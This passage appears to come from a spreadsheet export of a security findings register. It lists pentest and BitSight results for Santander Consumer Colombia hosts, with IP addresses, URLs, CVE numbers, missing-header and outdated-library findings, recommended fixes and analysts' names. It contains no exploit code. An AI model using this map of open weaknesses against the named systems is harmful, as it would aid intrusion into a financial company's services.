    <s v="Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad &quot;secure&quot;. De esta manera se evitando que el identificador de sesión pueda ser transmitido por canales no cifrados."/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <m/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="76"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Factoring"/>
    <s v="MAN-6512e91ef74e327f9d096a24"/>
    <s v="SC-23-CNMPO-001-CO-010"/>
    <x v="46"/>
    <m/>
    <x v="0"/>
    <s v="Low"/>
    <n v="3.5999999046325684"/>
    <m/>
    <m/>
    <s v="https://64.76.176.202/factoring/index.seam"/>
    <s v="443"/>
    <m/>
    <d v="2023-09-26T14:22:22"/>
    <n v="1000.4011342592567"/>
    <d v="2024-01-24T14:22:22"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-09T00:00:00"/>
    <s v="Durante las pruebas realizadas se ha comprobado que las páginas por defecto revelan información acerca del servidor JBossWS, Entre esta información se incluye el nombre del servidor, puertos que corren servicios en él, versiones de software utilizado, entre otros datos de interés para un atacante."/>
    <s v="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
    <s v="Conocer toda esta información, permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas, así como generar ataques más elaborados contra la plataforma."/>
    <m/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="77"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-651adc69f74e327f9d0a09b1"/>
    <s v="SC-23-CNMPA-002-CO-008"/>
    <x v="47"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.7000000476837158"/>
    <m/>
    <m/>
    <s v="https://190.85.213.99:4443/SimpleFinance/login"/>
    <m/>
    <m/>
    <d v="2023-10-02T15:06:17"/>
    <n v="994.37063657407271"/>
    <d v="2024-01-30T15:06:17"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que el servidor web no incluye la cabecera &quot;Content Security Policy&quot; en las respuestas HTTP del servidor._x000a_La cabecera &quot;Content Security Policy&quot; no se encuentra entre las cabeceras devueltas"/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación web y observar los recursos que utiliza la misma, si son locales o provienen de algún dominio externo, e incluirlos en la cabecera, ya que la propia cabecera &quot;Content Security Policy&quot; va a actuar como una lista blanca para los recursos JavaScript que pueden ser cargados en la aplicación web. _x000a__x000a_Es necesario configurar el servidor web para que devuelva la cabecera HTTP &quot;Content-Security-Policy&quot; (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se trata de una versión antigua y no es necesario configurarla). _x000a_Un ejemplo de configuración de cabecera es el siguiente: _x000a_• Content-Security-Policy: default-src 'self' *.trusted.com Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo: _x000a_• &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src 'none';&quot;&gt;_x000a_Para obtener una referencia completa acerca de todas las directivas &quot;Content Security Policy&quot; se recomienda visitar los siguientes enlaces: _x000a_• https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP _x000a_• https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"/>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s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="78"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-651adce0f74e327f9d0a09b2"/>
    <s v="SC-23-CNMPA-002-CO-009"/>
    <x v="10"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.7000000476837158"/>
    <m/>
    <m/>
    <s v="https://190.85.213.99:4443/SimpleFinance/login"/>
    <m/>
    <m/>
    <d v="2023-10-02T15:08:16"/>
    <n v="994.36925925925607"/>
    <d v="2024-01-30T15:08:16"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha comprobado que las cabeceras de respuesta del servidor y páginas por defecto revelan información interna acerca del tipo de servidor y versión del mismo, así como información de la infraestructura interna de la aplicación."/>
    <s v="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_x000a__x000a_https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/"/>
    <s v="Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como generar ataques más elaborados contra la plataforma."/>
    <s v="1° Fecha:  30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="79"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-651c2bf7f74e327f9d0a2f09"/>
    <s v="SC-23-CNMPA-004-AP-010"/>
    <x v="37"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.7000000476837158"/>
    <m/>
    <m/>
    <s v="santanderfinancing.com"/>
    <m/>
    <m/>
    <n v="45202.623599537037"/>
    <n v="993.37640046296292"/>
    <d v="2024-01-31T14:57:59"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se evidencia pueden observarse los metadatos presentes en el documento PDF descargado de la web. En ellos puede verse rutas internas del servidor y los programas utilizados para su creación"/>
    <s v="Se recomienda eliminar toda la información contenida en los metadatos de los documentos generados y/o publicados en la aplicación. De manera adicional se puede implementar un procedimiento para controlar los documentos a publicar, de manera tal de garantizar que los mismos no contengan información sensible de la organización en sus metadatos."/>
    <s v="La información contenida en los metadatos de los archivos identificados podría ser utilizada por un atacante para obtener un mayor conocimiento de la organización, tecnologías utilizadas e incluso nombres de usuarios. Con esta información el atacante puede planificar ataques más elaborados."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="80"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="BPM"/>
    <s v="MAN-6537dafaf74e327f9d0bf468"/>
    <s v="SC-23-CNMPO-006-CO-004"/>
    <x v="48"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.7000000476837158"/>
    <m/>
    <m/>
    <s v="https://bpm.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2023-10-24T14:55:54"/>
    <n v="972.37784722222568"/>
    <d v="2024-02-21T14:55:54"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que el servidor web no incluye la cabecera &quot;Content Security Policy&quot; en las respuestas HTTP del servidor._x000a__x000a_Se ha detectado que el servidor web incluye la cabecera &quot;Content Security Policy&quot; incorrectamente configurada en las respuestas HTTP del servidor. Al incluir las directivas unsafe-inline y unsafe-eval, se permite la ejecución de scripts inline y en formato string, dejando el aplicativo vulnerable ante ataques Cross Site Scripting."/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación web y observar los recursos que utiliza la misma, si son locales o provienen de algún dominio externo, e incluirlos en la cabecera, ya que la propia cabecera &quot;Content Security Policy&quot; va a actuar como una lista blanca para los recursos JavaScript que pueden ser cargados en la aplicación web. _x000a_Es necesario configurar el servidor web para que devuelva la cabecera HTTP &quot;Content-Security-Policy&quot; (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se trata de una versión antigua y no es necesario configurarla). _x000a_Un ejemplo de configuración de cabecera es el siguiente: _x000a_• Content-Security-Policy: default-src 'self' *.trusted.com _x000a_Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo: _x000a_• &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src 'none';&quot;&gt; Para obtener una referencia completa acerca de todas las directivas &quot;Content Security Policy&quot; se recomienda visitar los siguientes enlaces: _x000a_• https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP _x000a_• https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"/>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s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="81"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-6543d9b5f74e327f9d0d42ef"/>
    <s v="SC-23-CNMPO-011-CO-001"/>
    <x v="45"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.7000000476837158"/>
    <m/>
    <m/>
    <s v="https://aliados.santanderconsumer.co"/>
    <s v="443"/>
    <m/>
    <d v="2023-11-02T17:17:41"/>
    <n v="963.27938657407503"/>
    <d v="2024-03-01T17:17:41"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha comprobado que la cabecera “server” de la respuesta revela información interna acerca del tipo de servidor y versión de este en la aplicación a través de la dirección URL aliados.santanderconsumer.co/busca-credito/used-vehicle-service/v1/used-vehicle/validations_lead"/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa al software/framework y versión utilizado para desarrollar la propia aplicación. Para ello es necesario eliminar las cabeceras de respuesta HTTP, páginas por defecto y mensajes de error que divulguen este tipo de información._x000a__x000a_https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/"/>
    <s v="Conocer la versión y tipo del software o framework utilizado para desarrollar el aplicativo permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como generar ataques más elaborados contra la plataforma."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="82"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-66547fe2c382686af2c855ff"/>
    <s v="SCO-24-CNMPO-001-AP-002"/>
    <x v="49"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.7000000476837158"/>
    <m/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <s v="443"/>
    <m/>
    <n v="45439.530023148145"/>
    <n v="756.46997685185488"/>
    <d v="2024-09-24T12:43:14"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante el ejercicio de intrusión se ha comprobado que el servidor remoto no incluye en las cabeceras de respuesta &quot;Set-Cookie&quot; de la cookie incap_ses_482_2678343’ el atributo “HttpOnly”."/>
    <s v="Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad &quot;HttpOnly&quot;. De esta manera se evita que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX)."/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="83"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="BPM"/>
    <s v="MAN-665f3d943d46490637e0ddaa"/>
    <s v="SC0-24-CNMPO-002-VE-002"/>
    <x v="50"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.7000000476837158"/>
    <m/>
    <m/>
    <s v="https://bpm.santanderconsumer.co:8001/OriginacionPROD/"/>
    <s v="443"/>
    <m/>
    <d v="2024-06-04T16:15:16"/>
    <n v="748.32273148147942"/>
    <d v="2024-10-02T16:15:16"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que la aplicación auditada utiliza una versión de DOM Purify con vulnerabilidades públicas asociadas._x000a_Los detalles de las vulnerabilidades públicas de esta versión se pueden consultar en el siguiente enlace:_x000a_• https://security.snyk.io/package/npm/dompurify/2.0.11_x000a__x000a_Se ha detectado que la aplicación auditada utiliza una versión de JQuery con vulnerabilidades públicas asociadas._x000a_Los detalles de las vulnerabilidades públicas de esta versión se pueden consultar en el siguiente enlace:_x000a_• https://security.snyk.io/package/npm/jquery/2.1.0_x000a__x000a_Se ha detectado que la aplicación auditada utiliza una versión de JQuery UI con vulnerabilidades públicas asociadas._x000a_Los detalles de las vulnerabilidades públicas de esta versión se pueden consultar en el siguiente enlace:_x000a_• https://security.snyk.io/package/npm/jquery-ui_x000a_• https://github.com/michaeldotson/michaeldotson.github.io/issues/1"/>
    <s v="Se recomienda actualizar la versión de DOM Purify y establecer una política de actualizaciones o aplicación de parches para tratar evitar posteriores vulnerabilidades. _x000a_La última versión de DOMPurify puede ser descargada desde la siguiente dirección URL: _x000a_• https://github.com/cure53/DOMPurify _x000a__x000a_Se recomienda actualizar la versión de JQuery y establecer una política de actualizaciones o aplicación de parches para tratar evitar posteriores vulnerabilidades. _x000a_La última versión de JQuery puede ser descargada desde la siguiente dirección URL: _x000a_• https://jquery.com/download/ _x000a__x000a_Se recomienda actualizar la versión de JQuery UI y Touch Punch además de establecer una política de actualizaciones o aplicación de parches para tratar evitar posteriores vulnerabilidades. _x000a_La última versión de JQuery puede ser descargada desde la siguiente dirección URL: _x000a_• https://jqueryui.com/download/all/"/>
    <s v="El uso de software o librerías de terceros sin actualizar puede ser comprometido mediante vulnerabilidades conocidas poniendo en riesgo el activo afectado."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="84"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="BPM"/>
    <s v="MAN-665f3ef63d46490637e0ddb5"/>
    <s v="SC0-24-CNMPO-002-CO-003"/>
    <x v="10"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.7000000476837158"/>
    <m/>
    <m/>
    <s v="https://bpm.santanderconsumer.co:8001/OriginacionPROD/"/>
    <s v="443"/>
    <m/>
    <d v="2024-06-04T16:21:10"/>
    <n v="748.31863425925985"/>
    <d v="2024-10-02T16:21:10"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha comprobado que las cabeceras de respuesta del servidor revelan información interna acerca del tipo de servidor y versión del mismo así como información de la infraestructura interna de la aplicación a través de la siguiente dirección URL:_x000a_https://bpm.santanderconsumer.co:8001/"/>
    <s v="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_x000a__x000a_https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/"/>
    <s v="Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como generar ataques más elaborados contra la plataforma."/>
    <s v="1° Fecha:28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="85"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="MFT"/>
    <s v="MAN-66621cdf3d46490637ec5b35"/>
    <s v="SCO-24-CNMPO-006-CO-002"/>
    <x v="51"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.5999999046325684"/>
    <m/>
    <m/>
    <s v="mft.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-06-06T20:32:31"/>
    <n v="746.14408564814948"/>
    <d v="2024-10-04T20:32:31"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que el servidor web devuelve la cabecera &quot;Content Security Policy&quot; correctamente configurada en las respuestas HTTP del servidor. En el atributo script-src (encargado de controlar los recursos javascript), tiene definidos los atributos unsafe-inline y unsafe-eval, con lo cual permitiría el paso de cualquier ejecución de javascript, incluyendo ataques de tipo Cross Site Scripting._x000a__x000a_La cabecera &quot;Content Security Policy&quot; no se encuentra entre las cabeceras devueltas"/>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s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación web y observar los recursos que utiliza la misma, si son locales o provienen de algún dominio externo, e incluirlos en la cabecera, ya que la propia cabecera &quot;Content Security Policy&quot; va a actuar como una lista blanca para los recursos JavaScript que pueden ser cargados en la aplicación web. _x000a__x000a_Es necesario configurar el servidor web para que devuelva la cabecera HTTP &quot;Content-Security-Policy&quot; (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se trata de una versión antigua y no es necesario configurarla). _x000a_Un ejemplo de configuración de cabecera es el siguiente: _x000a_• Content-Security-Policy: default-src 'self' *.trusted.com _x000a_Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo: _x000a_• &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src 'none';&quot;&gt; _x000a_Además se recomienda evitar el uso de atributos como unsafe-inline y unsafe-eval._x000a_Para obtener una referencia completa acerca de todas las directivas &quot;Content Security Policy&quot; se recomienda visitar los siguientes enlaces: _x000a_• https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP _x000a_• https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"/>
    <m/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="86"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="MFT"/>
    <s v="MAN-66621e093d46490637ec5b36"/>
    <s v="SCO-24-CNMPO-006-VE-003"/>
    <x v="50"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.5999999046325684"/>
    <m/>
    <m/>
    <s v="mft.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-06-06T20:37:29"/>
    <n v="746.14063657407678"/>
    <d v="2024-10-04T20:37:29"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que la aplicación auditada utiliza una versión de JQuery UI con vulnerabilidades públicas asociadas._x000a_Los detalles de las vulnerabilidades públicas de esta versión se pueden consultar en el siguiente enlace:_x000a_https://security.snyk.io/package/npm/jquery-ui/1.12.1"/>
    <s v="Se recomienda actualizar la versión de JQuery UI y establecer una política de actualizaciones o aplicación de parches para tratar evitar posteriores vulnerabilidades. _x000a_La última versión de JQuery UI puede ser descargada desde la siguiente dirección URL: https://jqueryui.com/download/all/"/>
    <s v="El uso de software o librerías de terceros sin actualizar puede ser comprometido mediante vulnerabilidades conocidas poniendo en riesgo el activo afectado."/>
    <m/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="87"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="BPM"/>
    <m/>
    <m/>
    <x v="52"/>
    <m/>
    <x v="0"/>
    <s v="Warm"/>
    <m/>
    <m/>
    <m/>
    <s v="bpm.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-03-12T00:00:00"/>
    <n v="833"/>
    <d v="2024-06-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-21T00:00:00"/>
    <s v="Una política de seguridad de contenido (CSP) correctamente configurada puede ayudar a prevenir ataques de secuencias de comandos entre sitios (XSS) al restringir los orígenes de JavaScript, CSS y otros recursos potencialmente peligrosos. Una CSP adecuada debería: Implementar directivas que establezcan restricciones de fuentes válidas desde donde el cliente puede cargar marcos y secuencias de comandos, así como limitar dónde el cliente puede enviar datos de formularios. Restringir los complementos y especificar un recurso válido para informar sobre infracciones de políticas. No contener palabras clave &quot;inseguras&quot; ni incluir comodines que sean ineficaces para restringir las fuentes. Para esta evaluación, nos centraremos en el objetivo más esencial de una buena política de seguridad de contenido, que es prevenir los ataques de secuencias de comandos entre sitios y la inyección de contenido dinámico._x000a__x000a_Directiva: script-src_x000a_Valor: 'unsafe-inline'_x000a__x000a_Directiva: script-src_x000a_Valor: 'unsafe-eval'_x000a__x000a_Directiva: default-src_x000a_Valor: data:"/>
    <s v="Recomendamos revisar la CSP de cada sitio web para que sea eficaz en el cumplimiento de los objetivos de seguridad definidos para la Política de Seguridad de Contenido, como: Prevenir la carga de recursos de contenido y scripts no autorizados. Prevenir el clickjacking y otros ataques de marcos anidados. Asegurarse de que los formularios web y los enlaces se comporten como se espera. Específicamente para esta evaluación, nos estamos enfocando principalmente en prevenir ataques de Cross Site Scripting. Por lo tanto, para obtener una calificación BUENA, es suficiente: Implementar directivas que establezcan restricciones de origen válidas y completas para cargar contenido dinámico (script-src, object-src, default-src). Evitar el uso de directivas inseguras como 'unsafe-eval' y 'unsafe-inline'. Evitar errores tipográficos o directivas CSP no válidas. Evitar comodines, listas de permitidos basadas en host o esquemas de URL simples como 'HTTP' en directivas de origen."/>
    <s v="unsafe-inline' permite la ejecución de scripts dentro de la página y controladores de eventos inseguros._x000a__x000a_'unsafe-eval' permite la ejecución de código inyectado en las API DOM como eval()._x000a__x000a_datos: el URI en default-src permite la ejecución de scripts inseguros."/>
    <m/>
    <m/>
    <s v="Jenny Rodriguez_x000a_Alexander Parra"/>
  </r>
  <r>
    <n v="88"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="MFT"/>
    <m/>
    <m/>
    <x v="52"/>
    <m/>
    <x v="2"/>
    <s v="Warm"/>
    <m/>
    <m/>
    <m/>
    <s v="mft.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-08-25T00:00:00"/>
    <n v="667"/>
    <d v="2024-11-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se detectó una configuración de CSP incorrecta._x000a__x000a_Una política de seguridad de contenido (CSP) correctamente configurada puede ayudar a prevenir ataques de secuencias de comandos entre sitios (XSS) al restringir los orígenes de JavaScript, CSS y otros recursos potencialmente peligrosos. Una CSP adecuada debería: Implementar directivas que establezcan restricciones de fuentes válidas desde donde el cliente puede cargar marcos y secuencias de comandos, así como limitar dónde el cliente puede enviar datos de formularios. Restringir los complementos y especificar un recurso válido para informar sobre infracciones de políticas. No contener palabras clave &quot;inseguras&quot; ni incluir comodines que sean ineficaces para restringir las fuentes. Para esta evaluación, nos centraremos en el objetivo más esencial de una buena política de seguridad de contenido, que es prevenir los ataques de secuencias de comandos entre sitios y la inyección de contenido dinámico._x000a__x000a_Directiva: script-src_x000a__x000a_Valor: unsafe-inline'"/>
    <s v="Recomendamos revisar la CSP de cada sitio web para que sea eficaz en el cumplimiento de los objetivos de seguridad definidos para la Política de Seguridad de Contenido, como: Prevenir la carga de recursos de contenido y scripts no autorizados. Prevenir el clickjacking y otros ataques de marcos anidados. Asegurarse de que los formularios web y los enlaces se comporten como se espera. Específicamente para esta evaluación, nos estamos enfocando principalmente en prevenir ataques de Cross Site Scripting. Por lo tanto, para obtener una calificación BUENA, es suficiente: Implementar directivas que establezcan restricciones de origen válidas y completas para cargar contenido dinámico (script-src, object-src, default-src). Evitar el uso de directivas inseguras como 'unsafe-eval' y 'unsafe-inline'. Evitar errores tipográficos o directivas CSP no válidas. Evitar comodines, listas de permitidos basadas en host o esquemas de URL simples como 'HTTP' en directivas de origen._x000a__x000a_unsafe-inline': Permite la ejecución de scripts dentro de la página y controladores de eventos no seguros."/>
    <s v="unsafe-inline' permite la ejecución de scripts dentro de la página y controladores de eventos inseguros."/>
    <m/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="89"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="MFT"/>
    <m/>
    <m/>
    <x v="53"/>
    <m/>
    <x v="1"/>
    <s v="Warm"/>
    <m/>
    <s v="CVE-2021-41182_x000a_CVE-2022-31160_x000a_CVE-2021-41184_x000a_CVE-2021-41183"/>
    <m/>
    <s v="mft.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-01-18T00:00:00"/>
    <n v="887"/>
    <d v="2024-04-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Uso de una o más bibliotecas de JavaScript con vulnerabilidades conocidas_x000a__x000a_Librería: jquery-ui 1.12.1_x000a__x000a_https://mft.santanderconsumer.co/javax.faces.resource/jquery/jquery-plugins.js.xhtml?ln=primefaces&amp;v=7.0.14"/>
    <s v="Los propietarios de sitios web deben actualizar las bibliotecas JavaScript afectadas a versiones que no estén afectadas por vulnerabilidades conocidas o eliminar esa dependencia de la aplicación web."/>
    <m/>
    <m/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="90"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de la financiera"/>
    <m/>
    <m/>
    <x v="52"/>
    <m/>
    <x v="0"/>
    <s v="Warm"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-05-04T00:00:00"/>
    <n v="780"/>
    <d v="2024-08-02T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-21T00:00:00"/>
    <s v="Se detectó una configuración de CSP incorrecta._x000a__x000a_Una política de seguridad de contenido (CSP) correctamente configurada puede ayudar a prevenir ataques de secuencias de comandos entre sitios (XSS) al restringir los orígenes de JavaScript, CSS y otros recursos potencialmente peligrosos. Una CSP adecuada debería: Implementar directivas que establezcan restricciones de fuentes válidas desde donde el cliente puede cargar marcos y secuencias de comandos, así como limitar dónde el cliente puede enviar datos de formularios. Restringir los complementos y especificar un recurso válido para informar sobre infracciones de políticas. No contener palabras clave &quot;inseguras&quot; ni incluir comodines que sean ineficaces para restringir las fuentes. Para esta evaluación, nos centraremos en el objetivo más esencial de una buena política de seguridad de contenido, que es prevenir los ataques de secuencias de comandos entre sitios y la inyección de contenido dinámico._x000a__x000a_Directiva: script-src_x000a_Valor: 'unsafe-inline'_x000a__x000a_Directiva: script-src"/>
    <s v="Recomendamos revisar la CSP de cada sitio web para que sea eficaz en el cumplimiento de los objetivos de seguridad definidos para la Política de Seguridad de Contenido, como: Prevenir la carga de recursos de contenido y scripts no autorizados. Prevenir el clickjacking y otros ataques de marcos anidados. Asegurarse de que los formularios web y los enlaces se comporten como se espera. Específicamente para esta evaluación, nos estamos enfocando principalmente en prevenir ataques de Cross Site Scripting. Por lo tanto, para obtener una calificación BUENA, es suficiente: Implementar directivas que establezcan restricciones de origen válidas y completas para cargar contenido dinámico (script-src, object-src, default-src). Evitar el uso de directivas inseguras como 'unsafe-eval' y 'unsafe-inline'. Evitar errores tipográficos o directivas CSP no válidas. Evitar comodines, listas de permitidos basadas en host o esquemas de URL simples como 'HTTP' en directivas de origen."/>
    <s v="unsafe-inline' permite la ejecución de scripts dentro de la página y controladores de eventos inseguros._x000a__x000a_Las listas de permitidos de host se pueden eludir con frecuencia. Considere utilizar &quot;strict-dynamic&quot; en combinación con nonces o hashes de CSP."/>
    <m/>
    <m/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="91"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de la financiera"/>
    <m/>
    <m/>
    <x v="54"/>
    <m/>
    <x v="0"/>
    <s v="Warm"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-05-04T00:00:00"/>
    <n v="780"/>
    <d v="2024-08-02T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-21T00:00:00"/>
    <s v="La página intentó cargar un recurso que estaba bloqueado por la política CSP._x000a__x000a_Se rechazó la carga de la hoja de estilo 'https://fonts.googleapis.com/css?family=Montserrat:100' porque infringe la siguiente directiva de la Política de seguridad de contenido: &quot;style-src 'self' 'report-sample' 'unsafe-inline' tagmanager.google.com unpkg.com www.googletagmanager.com&quot;. Tenga en cuenta que 'style-src-elem' no se configuró explícitamente, por lo que 'style-src' se utiliza como alternativa._x000a__x000a_Se negó a cargar el script 'https://www.google.com/recaptcha/api.js?render=6LcBbTYiAAAAAFbK3rSpWk2V8w315JvH7z9ycQbm' porque infringe la siguiente directiva de la Política de seguridad de contenido: &quot;script-src 'self' 'report-sample' 'unsafe-inline' https://google-analytics.com https://googletagmanager.com https://ssl.google-analytics.com https://tagmanager.google.com https://unpkg.com https://www.google-analytics.com https://www.googletagmanager.com&quot;. Tenga en cuenta que 'script-src-elem' no se configuró explícitamente, por lo que 'script-src' se utiliza como respaldo."/>
    <s v="Los propietarios de sitios web deben revisar sus sitios para detectar mensajes de violación de CSP. Estos suelen ser una señal de que el sitio está intentando cargar recursos externos desconocidos o no verificados. Hay información detallada sobre estas violaciones disponible en la sección de detalles de evidencia."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="92"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
